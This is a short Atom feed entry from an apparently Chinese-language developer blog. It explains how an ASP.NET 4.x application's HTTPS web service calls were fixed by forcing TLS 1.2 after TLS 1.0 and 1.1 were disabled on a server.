    <id>https://rainmakerho.github.io/2022/07/12/tls-do-not-a-common-algorithm/</id>
    <published>2022-07-12T03:56:27.000Z</published>
    <updated>2022-07-12T05:02:11.911Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>最近同事將一台 Server 設定停用 TLS 1.0, TLS 1.1 後，<br>ASP.NET 4.X 的程式呼叫 Https 的 Web Service 會噴出 <strong>用戶端和伺服器無法溝通，因為它們沒有公用的演算法。</strong> 的錯誤。</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>後來在程式中設定強迫走 TLS 1.2 就可以正常運行。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;</span><br></pre></td></tr></table></figure><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://stackoverflow.com/questions/26742054/the-client-and-server-cannot-communicate-because-they-do-not-possess-a-common-a" target="_blank" rel="noopener">The client and server cannot communicate, because they do not possess a common algorithm - ASP.NET C# IIS TLS 1.0 / 1.1 / 1.2 - Win32Exception</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;最近同事將一台 Server 設定停用 TLS 1.0, TLS 1.1 後，&lt;br&gt;ASP.NET 4.X 的程式呼叫 Https 的 W
      
    
    </summary>
    
    
      <category term="ASP.NET" scheme="https://rainmakerho.github.io/tags/ASP-NET/"/>
    
      <category term="TLS" scheme="https://rainmakerho.github.io/tags/TLS/"/>
    
      <category term="TLS 1.2" scheme="https://rainmakerho.github.io/tags/TLS-1-2/"/>
    
      <category term="Disable TLS 1.1" scheme="https://rainmakerho.github.io/tags/Disable-TLS-1-1/"/>
    
  </entry>
  
</feed>
